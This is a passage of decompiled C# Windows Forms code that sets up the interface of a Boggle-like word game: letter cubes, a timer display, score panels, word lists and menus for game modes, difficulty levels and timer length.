		//IL_02dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e7: Expected O, but got Unknown
		//IL_02e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f2: Expected O, but got Unknown
		//IL_02f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fd: Expected O, but got Unknown
		//IL_02fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0308: Expected O, but got Unknown
		//IL_0377: Unknown result type (might be due to invalid IL or missing references)
		//IL_0381: Expected O, but got Unknown
		//IL_0382: Unknown result type (might be due to invalid IL or missing references)
		//IL_038c: Expected O, but got Unknown
		//IL_038d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0397: Expected O, but got Unknown
		//IL_0398: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a2: Expected O, but got Unknown
		//IL_03a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ad: Expected O, but got Unknown
		//IL_03ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b8: Expected O, but got Unknown
		//IL_03b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c3: Expected O, but got Unknown
		//IL_03c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ce: Expected O, but got Unknown
		//IL_03cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d9: Expected O, but got Unknown
		//IL_03da: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e4: Expected O, but got Unknown
		//IL_03e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ef: Expected O, but got Unknown
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fa: Expected O, but got Unknown
		//IL_03fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0405: Expected O, but got Unknown
		//IL_0427: Unknown result type (might be due to invalid IL or missing references)
		//IL_0431: Expected O, but got Unknown
		//IL_0432: Unknown result type (might be due to invalid IL or missing references)
		//IL_043c: Expected O, but got Unknown
		//IL_043d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Expected O, but got Unknown
		//IL_0448: Unknown result type (might be due to invalid IL or missing references)
		//IL_0452: Expected O, but got Unknown
		//IL_0453: Unknown result type (might be due to invalid IL or missing references)
		//IL_045d: Expected O, but got Unknown
		//IL_045e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0468: Expected O, but got Unknown
		//IL_0474: Unknown result type (might be due to invalid IL or missing references)
		//IL_047e: Expected O, but got Unknown
		//IL_047f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0489: Expected O, but got Unknown
		//IL_048a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0494: Expected O, but got Unknown
		//IL_04b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c0: Expected O, but got Unknown
		//IL_04e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ec: Expected O, but got Unknown
		//IL_14ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_14d4: Expected O, but got Unknown
		//IL_1bbe: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bc8: Expected O, but got Unknown
		//IL_1c6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c76: Expected O, but got Unknown
		//IL_2223: Unknown result type (might be due to invalid IL or missing references)
		//IL_222d: Expected O, but got Unknown
		//IL_243e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2448: Expected O, but got Unknown
		//IL_24e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_24ef: Expected O, but got Unknown
		//IL_258f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2599: Expected O, but got Unknown
		//IL_263d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2647: Expected O, but got Unknown
		//IL_26e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_26ee: Expected O, but got Unknown
		//IL_278b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2795: Expected O, but got Unknown
		//IL_2826: Unknown result type (might be due to invalid IL or missing references)
		//IL_2830: Expected O, but got Unknown
		//IL_28c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_28cb: Expected O, but got Unknown
		//IL_2ae2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aec: Expected O, but got Unknown
		//IL_2b90: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b9a: Expected O, but got Unknown
		//IL_2c3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c48: Expected O, but got Unknown
		//IL_2ce5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cef: Expected O, but got Unknown
		//IL_2d8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d96: Expected O, but got Unknown
		//IL_2e33: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e3d: Expected O, but got Unknown
		//IL_3012: Unknown result type (might be due to invalid IL or missing references)
		//IL_301c: Expected O, but got Unknown
		components = new Container();
		pnlCubes = new BogPanel();
		pnlTimer = new BogPanel();
		tmrMain = new BogTimer();
		BogBorder2 = new BogBorder();
		BogBorder6 = new BogBorder();
		BogBorder7 = new BogBorder();
		BogBorder8 = new BogBorder();
		lbl1 = new CircleLabel();
		lbl4 = new CircleLabel();
		lbl3 = new CircleLabel();
		lbl2 = new CircleLabel();
		lbl5 = new CircleLabel();
		lbl6 = new CircleLabel();
		lbl7 = new CircleLabel();
		lbl8 = new CircleLabel();
		lbl9 = new CircleLabel();
		lbl10 = new CircleLabel();
		lbl11 = new CircleLabel();
		lbl12 = new CircleLabel();
		lbl13 = new CircleLabel();
		lbl14 = new CircleLabel();
		lbl15 = new CircleLabel();
		lbl16 = new CircleLabel();
		picCubeDown = new PictureBox();
		btnAddWord = new BogButton();
		lstHumanWordsFound = new ListBox();
		mnuMain = new MainMenu();
		mnuGame = new MenuItem();
		mnuNewGame = new MenuItem();
		mnuEndGame = new MenuItem();
		MenuItem8 = new MenuItem();
		mnuHighScores = new MenuItem();
		MenuItem2 = new MenuItem();
		mnuExitGame = new MenuItem();
		mnuOptions = new MenuItem();
		mnuEnableDefSearch = new MenuItem();
		MenuItem1 = new MenuItem();
		mnuMode = new MenuItem();
		mnuBoardGameMode = new MenuItem();
		mnuVsMode = new MenuItem();
		mnuTeachingMode = new MenuItem();
		MenuItem3 = new MenuItem();
		mnuLevelEasy = new MenuItem();
		mnuLevelMedium = new MenuItem();
		mnuLevelHard = new MenuItem();
		mnuLevelImpossible = new MenuItem();
		MenuItem4 = new MenuItem();
		mnuTimerInterval = new MenuItem();
		mnuTmr30 = new MenuItem();
		mnuTmr100 = new MenuItem();
		mnuTmr130 = new MenuItem();
		mnuTmr200 = new MenuItem();
		mnuTmr230 = new MenuItem();
		mnuTmr300 = new MenuItem();
		mnuTmr330 = new MenuItem();
		mnuTmr400 = new MenuItem();
		mnuTmr430 = new MenuItem();
		mnuTmr500 = new MenuItem();
		mnuEnableTimerFlash = new MenuItem();
		MenuItem5 = new MenuItem();
		mnuEnableWordValidation = new MenuItem();
		mnuHelp = new MenuItem();
		mnuAbout = new MenuItem();
		MenuItem6 = new MenuItem();
		mnuTips = new MenuItem();
		tmrContMain = new Timer(components);
		txtWordFound = new TextBox();
		lblHumanScore = new Label();
		Panel1 = new Panel();
		pnlScore = new BogPanel();
		pnlWords = new BogPanel();
		BogBorder9 = new BogBorder();
		BogBorder10 = new BogBorder();
		BogBorder11 = new BogBorder();
		BogBorder12 = new BogBorder();
		BogBorder13 = new BogBorder();
		BogBorder14 = new BogBorder();
		BogBorder15 = new BogBorder();
		BogBorder16 = new BogBorder();
		lstCompFoundWords = new ListBox();
		tmrBtn1 = new Button();
		tmrBtn2 = new Button();
		tmrBtn3 = new Button();
		tmrBtn4 = new Button();
		Label1 = new Label();
		Label2 = new Label();
		lblCompScore = new Label();
		Label3 = new Label();
		Label4 = new Label();
		Label5 = new Label();
		lblHumanWordsCount = new Label();
		lblCompWordsCount = new Label();
		btnContinue = new BogButton();
		btnScramble = new BogButton();
		btnFinish = new BogButton();
		lblHumanRounds = new Label();
		lblComputerRounds = new Label();
		Label7 = new Label();
		Label8 = new Label();
		lblRound = new Label();
		Label6 = new Label();
		BogBorder5 = new BogBorder();
		Panel3 = new Panel();
		Panel2 = new Panel();
		txtMain = new RichTextBox();
		BogBorder4 = new BogBorder();
		BogBorder3 = new BogBorder();
		BogBorder1 = new BogBorder();
		picCubesUp = new PictureBox();
		CircleLabel1 = new CircleLabel();
		CircleLabel2 = new CircleLabel();
		CircleLabel3 = new CircleLabel();
		PictureBox1 = new PictureBox();
		((Control)this).SuspendLayout();
		((Control)pnlCubes).set_BackColor(Color.DarkGray);
		BogPanel bogPanel = pnlCubes;
		Point location = new Point(310, -3);
		((Control)bogPanel).set_Location(location);
		((Control)pnlCubes).set_Name("pnlCubes");
		BogPanel bogPanel2 = pnlCubes;
		Size size = new Size(539, 650);
		((Control)bogPanel2).set_Size(size);
		((PictureBox)pnlCubes).set_TabIndex(6);
		((PictureBox)pnlCubes).set_TabStop(false);
		((Control)pnlTimer).set_BackColor(Color.DarkGray);
		BogPanel bogPanel3 = pnlTimer;
		location = new Point(35, -1);
		((Control)bogPanel3).set_Location(location);
		((Control)pnlTimer).set_Name("pnlTimer");
		BogPanel bogPanel4 = pnlTimer;
		size = new Size(237, 166);
		((Control)bogPanel4).set_Size(size);
		((PictureBox)pnlTimer).set_TabIndex(7);
		((PictureBox)pnlTimer).set_TabStop(false);
		((Control)tmrMain).set_BackColor(Color.Black);
		tmrMain.EnableFlash = false;
		tmrMain.LedBackColor = Color.Black;
		tmrMain.LedOffColor = Color.FromArgb(0, 0, 70);
		tmrMain.LedOnColor = Color.DeepSkyBlue;
		BogTimer bogTimer = tmrMain;
		location = new Point(69, 24);
		((Control)bogTimer).set_Location(location);
		((Control)tmrMain).set_Name("tmrMain");
		BogTimer bogTimer2 = tmrMain;
		size = new Size(168, 80);
		((Control)bogTimer2).set_Size(size);
		((Control)tmrMain).set_TabIndex(8);
		tmrMain.TimerText = null;
		((Control)BogBorder2).set_BackColor(Color.DarkGray);
		BogBorder2.BorderDirection = BogBorder.Direction.Left;
		BogBorder bogBorder = BogBorder2;
		location = new Point(59, 13);
		((Control)bogBorder).set_Location(location);
		((Control)BogBorder2).set_Name("BogBorder2");
		BogBorder bogBorder2 = BogBorder2;
		size = new Size(10, 102);
		((Control)bogBorder2).set_Size(size);
		((PictureBox)BogBorder2).set_TabIndex(14);
		((PictureBox)BogBorder2).set_TabStop(false);
		((Control)BogBorder6).set_BackColor(Color.DarkGray);
		BogBorder6.BorderDirection = BogBorder.Direction.Top;
		BogBorder bogBorder3 = BogBorder6;
		location = new Point(69, 16);
		((Control)bogBorder3).set_Location(location);
		((Control)BogBorder6).set_Name("BogBorder6");
		BogBorder bogBorder4 = BogBorder6;
		size = new Size(168, 9);
		((Control)bogBorder4).set_Size(size);
		((PictureBox)BogBorder6).set_TabIndex(15);
		((PictureBox)BogBorder6).set_TabStop(false);
		((Control)BogBorder7).set_BackColor(Color.DarkGray);
		BogBorder7.BorderDirection = BogBorder.Direction.Bottom;
		BogBorder bogBorder5 = BogBorder7;
		location = new Point(69, 104);
		((Control)bogBorder5).set_Location(location);
		((Control)BogBorder7).set_Name("BogBorder7");
		BogBorder bogBorder6 = BogBorder7;
		size = new Size(168, 9);
		((Control)bogBorder6).set_Size(size);
		((PictureBox)BogBorder7).set_TabIndex(16);
		((PictureBox)BogBorder7).set_TabStop(false);
		((Control)BogBorder8).set_BackColor(Color.DarkGray);
		BogBorder8.BorderDirection = BogBorder.Direction.Right;
		BogBorder bogBorder7 = BogBorder8;
		location = new Point(237, 16);
		((Control)bogBorder7).set_Location(location);
		((Control)BogBorder8).set_Name("BogBorder8");
		BogBorder bogBorder8 = BogBorder8;
		size = new Size(10, 97);
		((Control)bogBorder8).set_Size(size);
		((PictureBox)BogBorder8).set_TabIndex(17);
		((PictureBox)BogBorder8).set_TabStop(false);
		((Control)lbl1).set_BackColor(Color.LightGray);
		lbl1.CubeHighLight = Color.LightGray;
		lbl1.CubeText = "W";
		lbl1.CubeTextColor = Color.DarkBlue;
		lbl1.CubeTopRadius = 55L;
		CircleLabel circleLabel = lbl1;
		location = new Point(386, 186);
		((Control)circleLabel).set_Location(location);
		((Control)lbl1).set_Name("lbl1");
		CircleLabel circleLabel2 = lbl1;
		size = new Size(55, 55);
		((Control)circleLabel2).set_Size(size);
		((Control)lbl1).set_TabIndex(19);
		((Control)lbl1).set_Tag((object)"00");
		((Control)lbl4).set_BackColor(Color.LightGray);
		lbl4.CubeHighLight = Color.LightGray;
		lbl4.CubeText = "W";
		lbl4.CubeTextColor = Color.DarkBlue;
		lbl4.CubeTopRadius = 55L;
		CircleLabel circleLabel3 = lbl4;
		location = new Point(609, 190);
		((Control)circleLabel3).set_Location(location);
		((Control)lbl4).set_Name("lbl4");
		CircleLabel circleLabel4 = lbl4;
		size = new Size(55, 55);
		((Control)circleLabel4).set_Size(size);
		((Control)lbl4).set_TabIndex(20);
		((Control)lbl4).set_Tag((object)"30");
		((Control)lbl3).set_BackColor(Color.LightGray);
		lbl3.CubeHighLight = Color.LightGray;
		lbl3.CubeText = "W";
		lbl3.CubeTextColor = Color.DarkBlue;
		lbl3.CubeTopRadius = 55L;
		CircleLabel circleLabel5 = lbl3;
		location = new Point(532, 189);
		((Control)circleLabel5).set_Location(location);
		((Control)lbl3).set_Name("lbl3");
		CircleLabel circleLabel6 = lbl3;
		size = new Size(55, 55);
		((Control)circleLabel6).set_Size(size);
		((Control)lbl3).set_TabIndex(21);
		((Control)lbl3).set_Tag((object)"20");
		((Control)lbl2).set_BackColor(Color.LightGray);
		lbl2.CubeHighLight = Color.LightGray;
		lbl2.CubeText = "W";
		lbl2.CubeTextColor = Color.DarkBlue;
		lbl2.CubeTopRadius = 55L;
		CircleLabel circleLabel7 = lbl2;
		location = new Point(459, 188);
		((Control)circleLabel7).set_Location(location);
		((Control)lbl2).set_Name("lbl2");
		CircleLabel circleLabel8 = lbl2;
		size = new Size(55, 55);
		((Control)circleLabel8).set_Size(size);
		((Control)lbl2).set_TabIndex(22);
		((Control)lbl2).set_Tag((object)"10");
		((Control)lbl5).set_BackColor(Color.LightGray);
		lbl5.CubeHighLight = Color.LightGray;
		lbl5.CubeText = "W";
		lbl5.CubeTextColor = Color.DarkBlue;
		lbl5.CubeTopRadius = 55L;
		CircleLabel circleLabel9 = lbl5;
		location = new Point(389, 262);
		((Control)circleLabel9).set_Location(location);
		((Control)lbl5).set_Name("lbl5");
		CircleLabel circleLabel10 = lbl5;
		size = new Size(55, 55);
		((Control)circleLabel10).set_Size(size);
		((Control)lbl5).set_TabIndex(23);
		((Control)lbl5).set_Tag((object)"01");
		((Control)lbl6).set_BackColor(Color.LightGray);
		lbl6.CubeHighLight = Color.LightGray;
		lbl6.CubeText = "W";
		lbl6.CubeTextColor = Color.DarkBlue;
		lbl6.CubeTopRadius = 55L;
		CircleLabel circleLabel11 = lbl6;
		location = new Point(462, 261);
		((Control)circleLabel11).set_Location(location);
		((Control)lbl6).set_Name("lbl6");
		CircleLabel circleLabel12 = lbl6;
		size = new Size(55, 55);
		((Control)circleLabel12).set_Size(size);
		((Control)lbl6).set_TabIndex(24);
		((Control)lbl6).set_Tag((object)"11");
		((Control)lbl7).set_BackColor(Color.LightGray);
		lbl7.CubeHighLight = Color.LightGray;
		lbl7.CubeText = "W";
		lbl7.CubeTextColor = Color.DarkBlue;
		lbl7.CubeTopRadius = 55L;
		CircleLabel circleLabel13 = lbl7;
		location = new Point(535, 261);
		((Control)circleLabel13).set_Location(location);
		((Control)lbl7).set_Name("lbl7");
		CircleLabel circleLabel14 = lbl7;
		size = new Size(55, 55);
		((Control)circleLabel14).set_Size(size);
		((Control)lbl7).set_TabIndex(25);
		((Control)lbl7).set_Tag((object)"21");
		((Control)lbl8).set_BackColor(Color.LightGray);
		lbl8.CubeHighLight = Color.LightGray;
		lbl8.CubeText = "W";
		lbl8.CubeTextColor = Color.DarkBlue;
		lbl8.CubeTopRadius = 55L;
		CircleLabel circleLabel15 = lbl8;
		location = new Point(612, 261);
		((Control)circleLabel15).set_Location(location);
		((Control)lbl8).set_Name("lbl8");
		CircleLabel circleLabel16 = lbl8;
		size = new Size(55, 55);
		((Control)circleLabel16).set_Size(size);
		((Control)lbl8).set_TabIndex(26);
		((Control)lbl8).set_Tag((object)"31");
		((Control)lbl9).set_BackColor(Color.LightGray);
		lbl9.CubeHighLight = Color.LightGray;
		lbl9.CubeText = "W";
		lbl9.CubeTextColor = Color.DarkBlue;
		lbl9.CubeTopRadius = 55L;
		CircleLabel circleLabel17 = lbl9;
		location = new Point(393, 340);
		((Control)circleLabel17).set_Location(location);
		((Control)lbl9).set_Name("lbl9");
		CircleLabel circleLabel18 = lbl9;
		size = new Size(55, 55);
		((Control)circleLabel18).set_Size(size);
		((Control)lbl9).set_TabIndex(27);
		((Control)lbl9).set_Tag((object)"02");
		((Control)lbl10).set_BackColor(Color.LightGray);
		lbl10.CubeHighLight = Color.LightGray;
		lbl10.CubeText = "W";
		lbl10.CubeTextColor = Color.DarkBlue;
		lbl10.CubeTopRadius = 55L;
		CircleLabel circleLabel19 = lbl10;
		location = new Point(462, 342);
		((Control)circleLabel19).set_Location(location);
		((Control)lbl10).set_Name("lbl10");
		CircleLabel circleLabel20 = lbl10;
		size = new Size(55, 55);
		((Control)circleLabel20).set_Size(size);
		((Control)lbl10).set_TabIndex(28);
		((Control)lbl10).set_Tag((object)"12");
		((Control)lbl11).set_BackColor(Color.LightGray);
		lbl11.CubeHighLight = Color.LightGray;
		lbl11.CubeText = "W";
		lbl11.CubeTextColor = Color.DarkBlue;
		lbl11.CubeTopRadius = 55L;
		CircleLabel circleLabel21 = lbl11;
		location = new Point(537, 339);
		((Control)circleLabel21).set_Location(location);
		((Control)lbl11).set_Name("lbl11");
		CircleLabel circleLabel22 = lbl11;
		size = new Size(55, 55);
		((Control)circleLabel22).set_Size(size);
		((Control)lbl11).set_TabIndex(29);
		((Control)lbl11).set_Tag((object)"22");
		((Control)lbl12).set_BackColor(Color.LightGray);
		lbl12.CubeHighLight = Color.LightGray;
		lbl12.CubeText = "W";
		lbl12.CubeTextColor = Color.DarkBlue;
		lbl12.CubeTopRadius = 55L;
		CircleLabel circleLabel23 = lbl12;
		location = new Point(613, 338);
		((Control)circleLabel23).set_Location(location);
		((Control)lbl12).set_Name("lbl12");
		CircleLabel circleLabel24 = lbl12;
		size = new Size(55, 55);
		((Control)circleLabel24).set_Size(size);
		((Control)lbl12).set_TabIndex(30);
		((Control)lbl12).set_Tag((object)"32");
		((Control)lbl13).set_BackColor(Color.LightGray);
		lbl13.CubeHighLight = Color.LightGray;
		lbl13.CubeText = "W";
		lbl13.CubeTextColor = Color.DarkBlue;
		lbl13.CubeTopRadius = 55L;
		CircleLabel circleLabel25 = lbl13;
		location = new Point(389, 415);
		((Control)circleLabel25).set_Location(location);
		((Control)lbl13).set_Name("lbl13");
		CircleLabel circleLabel26 = lbl13;
		size = new Size(55, 55);
		((Control)circleLabel26).set_Size(size);
		((Control)lbl13).set_TabIndex(31);
		((Control)lbl13).set_Tag((object)"03");
		((Control)lbl14).set_BackColor(Color.LightGray);
		lbl14.CubeHighLight = Color.LightGray;
		lbl14.CubeText = "W";
		lbl14.CubeTextColor = Color.DarkBlue;
		lbl14.CubeTopRadius = 55L;
		CircleLabel circleLabel27 = lbl14;
		location = new Point(463, 412);
		((Control)circleLabel27).set_Location(location);
		((Control)lbl14).set_Name("lbl14");
		CircleLabel circleLabel28 = lbl14;
		size = new Size(55, 55);
		((Control)circleLabel28).set_Size(size);
		((Control)lbl14).set_TabIndex(32);
		((Control)lbl14).set_Tag((object)"13");
		((Control)lbl15).set_BackColor(Color.LightGray);
		lbl15.CubeHighLight = Color.LightGray;
		lbl15.CubeText = "W";
		lbl15.CubeTextColor = Color.DarkBlue;
		lbl15.CubeTopRadius = 55L;
		CircleLabel circleLabel29 = lbl15;
		location = new Point(542, 413);
		((Control)circleLabel29).set_Location(location);
		((Control)lbl15).set_Name("lbl15");
		CircleLabel circleLabel30 = lbl15;
		size = new Size(55, 55);
		((Control)circleLabel30).set_Size(size);
		((Control)lbl15).set_TabIndex(33);
		((Control)lbl15).set_Tag((object)"23");
		((Control)lbl16).set_BackColor(Color.LightGray);
		lbl16.CubeHighLight = Color.LightGray;
		lbl16.CubeText = "W";
		lbl16.CubeTextColor = Color.DarkBlue;
		lbl16.CubeTopRadius = 55L;
		CircleLabel circleLabel31 = lbl16;
		location = new Point(613, 414);
		((Control)circleLabel31).set_Location(location);
		((Control)lbl16).set_Name("lbl16");
		CircleLabel circleLabel32 = lbl16;
		size = new Size(55, 55);
		((Control)circleLabel32).set_Size(size);
		((Control)lbl16).set_TabIndex(34);
		((Control)lbl16).set_Tag((object)"33");
		((Control)picCubeDown).set_BackColor(Color.FromArgb(0, 0, 192));
		PictureBox obj = picCubeDown;
		location = new Point(693, 189);
		((Control)obj).set_Location(location);
		((Control)picCubeDown).set_Name("picCubeDown");
		PictureBox obj2 = picCubeDown;
		size = new Size(74, 75);
		((Control)obj2).set_Size(size);
		picCubeDown.set_TabIndex(35);
		picCubeDown.set_TabStop(false);
		btnAddWord.BogButtonEnabled = false;
		btnAddWord.ButtonText = "Add Word";
		BogButton bogButton = btnAddWord;
		location = new Point(187, 180);
		((Control)bogButton).set_Location(location);
		((Control)btnAddWord).set_Name("btnAddWord");
		BogButton bogButton2 = btnAddWord;
		size = new Size(93, 49);
		((Control)bogButton2).set_Size(size);
		((Control)btnAddWord).set_TabIndex(36);
		((Control)btnAddWord).set_Tag((object)"Continue");
		((Control)btnAddWord).set_Text("Add Word");
		lstHumanWordsFound.set_BackColor(Color.Black);
		lstHumanWordsFound.set_BorderStyle((BorderStyle)0);
		((Control)lstHumanWordsFound).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		lstHumanWordsFound.set_ForeColor(Color.DodgerBlue);
		ListBox obj3 = lstHumanWordsFound;
		location = new Point(58, 381);
		((Control)obj3).set_Location(location);
		((Control)lstHumanWordsFound).set_Name("lstHumanWordsFound");
		ListBox obj4 = lstHumanWordsFound;
		size = new Size(81, 234);
		((Control)obj4).set_Size(size);
		((Control)lstHumanWordsFound).set_TabIndex(40);
		((Menu)mnuMain).get_MenuItems().AddRange((MenuItem[])(object)new MenuItem[3] { mnuGame, mnuOptions, mnuHelp });
		mnuGame.set_Enabled(false);
		mnuGame.set_Index(0);
		((Menu)mnuGame).get_MenuItems().AddRange((MenuItem[])(object)new MenuItem[6] { mnuNewGame, mnuEndGame, MenuItem8, mnuHighScores, MenuItem2, mnuExitGame });
		mnuGame.set_Text("&Game");
		mnuNewGame.set_Index(0);
		mnuNewGame.set_Text("New Game...");
		mnuEndGame.set_Index(1);
		mnuEndGame.set_Text("End Game");
		MenuItem8.set_Index(2);
		MenuItem8.set_Text("-");
		mnuHighScores.set_Index(3);
		mnuHighScores.set_Text("High Scores...");
		MenuItem2.set_Index(4);
		MenuItem2.set_Text("-");
		mnuExitGame.set_Index(5);
		mnuExitGame.set_Text("Exit ");
		mnuOptions.set_Enabled(false);
		mnuOptions.set_Index(1);
		((Menu)mnuOptions).get_MenuItems().AddRange((MenuItem[])(object)new MenuItem[13]
		{
			mnuEnableDefSearch, MenuItem1, mnuMode, MenuItem3, mnuLevelEasy, mnuLevelMedium, mnuLevelHard, mnuLevelImpossible, MenuItem4, mnuTimerInterval,
			mnuEnableTimerFlash, MenuItem5, mnuEnableWordValidation
		});
		mnuOptions.set_Text("&Options");
		mnuEnableDefSearch.set_Index(0);
		mnuEnableDefSearch.set_Text("Enable Defention Search");
		MenuItem1.set_Index(1);
		MenuItem1.set_Text("-");
		mnuMode.set_Index(2);
		((Menu)mnuMode).get_MenuItems().AddRange((MenuItem[])(object)new MenuItem[3] { mnuBoardGameMode, mnuVsMode, mnuTeachingMode });
		mnuMode.set_Text("Mode...");
		mnuBoardGameMode.set_Index(0);
		mnuBoardGameMode.set_Text("Board Game Mode");
		mnuVsMode.set_Index(1);
		mnuVsMode.set_Text("Vs. Computer Mode");
		mnuTeachingMode.set_Index(2);
		mnuTeachingMode.set_Text("Teaching Mode");
		MenuItem3.set_Index(3);
		MenuItem3.set_Text("-");
		mnuLevelEasy.set_Index(4);
		mnuLevelEasy.set_Text("Level Easy");
		mnuLevelMedium.set_Index(5);
		mnuLevelMedium.set_Text("Level Medium");
		mnuLevelHard.set_Index(6);
		mnuLevelHard.set_Text("Level Hard");
		mnuLevelImpossible.set_Index(7);
		mnuLevelImpossible.set_Text("Level Impossible ");
		MenuItem4.set_Index(8);
		MenuItem4.set_Text("-");
		mnuTimerInterval.set_Index(9);
		((Menu)mnuTimerInterval).get_MenuItems().AddRange((MenuItem[])(object)new MenuItem[10] { mnuTmr30, mnuTmr100, mnuTmr130, mnuTmr200, mnuTmr230, mnuTmr300, mnuTmr330, mnuTmr400, mnuTmr430, mnuTmr500 });
		mnuTimerInterval.set_Text("Timer Interval...");
		mnuTmr30.set_Index(0);
		mnuTmr30.set_Text(":30");
		mnuTmr100.set_Index(1);
		mnuTmr100.set_Text("1:00");
		mnuTmr130.set_Index(2);
		mnuTmr130.set_Text("1:30");
		mnuTmr200.set_Index(3);
		mnuTmr200.set_Text("2:00");
		mnuTmr230.set_Index(4);
		mnuTmr230.set_Text("2:30");
		mnuTmr300.set_Index(5);
		mnuTmr300.set_Text("3:00");
		mnuTmr330.set_Index(6);
		mnuTmr330.set_Text("3:30");
		mnuTmr400.set_Index(7);
		mnuTmr400.set_Text("4:00");
		mnuTmr430.set_Index(8);
		mnuTmr430.set_Text("4:30");
		mnuTmr500.set_Index(9);
		mnuTmr500.set_Text("5:00");
		mnuEnableTimerFlash.set_Index(10);
		mnuEnableTimerFlash.set_Text("Enable Timer Flash");
		MenuItem5.set_Index(11);
		MenuItem5.set_Text("-");
		mnuEnableWordValidation.set_Index(12);
		mnuEnableWordValidation.set_Text("Enable Word Validation");
		mnuHelp.set_Enabled(false);
		mnuHelp.set_Index(2);
		((Menu)mnuHelp).get_MenuItems().AddRange((MenuItem[])(object)new MenuItem[3] { mnuAbout, MenuItem6, mnuTips });
		mnuHelp.set_Text("&Help");
		mnuAbout.set_Index(0);
		mnuAbout.set_Text("About...");
		MenuItem6.set_Index(1);
		MenuItem6.set_Text("-");
		mnuTips.set_Index(2);
		mnuTips.set_Text("Tips...");
		tmrContMain.set_Enabled(true);
		tmrContMain.set_Interval(500);
		((TextBoxBase)txtWordFound).set_BackColor(Color.Silver);
		((TextBoxBase)txtWordFound).set_BorderStyle((BorderStyle)1);
		((Control)txtWordFound).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)txtWordFound).set_ForeColor(Color.FromArgb(0, 0, 192));
		TextBox obj5 = txtWordFound;
		location = new Point(35, 203);
		((Control)obj5).set_Location(location);
		((Control)txtWordFound).set_Name("txtWordFound");
		TextBox obj6 = txtWordFound;
		size = new Size(116, 22);
		((Control)obj6).set_Size(size);
		((Control)txtWordFound).set_TabIndex(41);
		txtWordFound.set_Text("");
		((Control)lblHumanScore).set_BackColor(Color.Silver);
		lblHumanScore.set_BorderStyle((BorderStyle)1);
		((Control)lblHumanScore).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblHumanScore).set_ForeColor(Color.FromArgb(0, 0, 192));
		Label obj7 = lblHumanScore;
		location = new Point(35, 244);
		((Control)obj7).set_Location(location);
		((Control)lblHumanScore).set_Name("lblHumanScore");
		Label obj8 = lblHumanScore;
		size = new Size(80, 19);
		((Control)obj8).set_Size(size);
		((Control)lblHumanScore).set_TabIndex(42);
		((Control)lblHumanScore).set_Text("0");
		((Control)Panel1).set_BackColor(Color.Black);
		Panel panel = Panel1;
		location = new Point(365, 75);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(17, 97);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(43);
		((Control)pnlScore).set_BackColor(Color.DarkGray);
		BogPanel bogPanel5 = pnlScore;
		location = new Point(-3, 161);
		((Control)bogPanel5).set_Location(location);
		((Control)pnlScore).set_Name("pnlScore");
		BogPanel bogPanel6 = pnlScore;
		size = new Size(318, 174);
		((Control)bogPanel6).set_Size(size);
		((PictureBox)pnlScore).set_TabIndex(46);
		((PictureBox)pnlScore).set_TabStop(false);
		((Control)pnlWords).set_BackColor(Color.DarkGray);
		BogPanel bogPanel7 = pnlWords;
		location = new Point(-5, 331);
		((Control)bogPanel7).set_Location(location);
		((Control)pnlWords).set_Name("pnlWords");
		BogPanel bogPanel8 = pnlWords;
		size = new Size(318, 315);
		((Control)bogPanel8).set_Size(size);
		((PictureBox)pnlWords).set_TabIndex(47);
		((PictureBox)pnlWords).set_TabStop(false);
		((Control)BogBorder9).set_BackColor(Color.DarkGray);
		BogBorder9.BorderDirection = BogBorder.Direction.Left;
		BogBorder bogBorder9 = BogBorder9;
		location = new Point(48, 370);
		((Control)bogBorder9).set_Location(location);
		((Control)BogBorder9).set_Name("BogBorder9");
		BogBorder bogBorder10 = BogBorder9;
		size = new Size(12, 258);
		((Control)bogBorder10).set_Size(size);
		((PictureBox)BogBorder9).set_TabIndex(48);
		((PictureBox)BogBorder9).set_TabStop(false);
		((Control)BogBorder10).set_BackColor(Color.DarkGray);
		BogBorder10.BorderDirection = BogBorder.Direction.Right;
		BogBorder bogBorder11 = BogBorder10;
		location = new Point(139, 372);
		((Control)bogBorder11).set_Location(location);
		((Control)BogBorder10).set_Name("BogBorder10");
		BogBorder bogBorder12 = BogBorder10;
		size = new Size(12, 254);
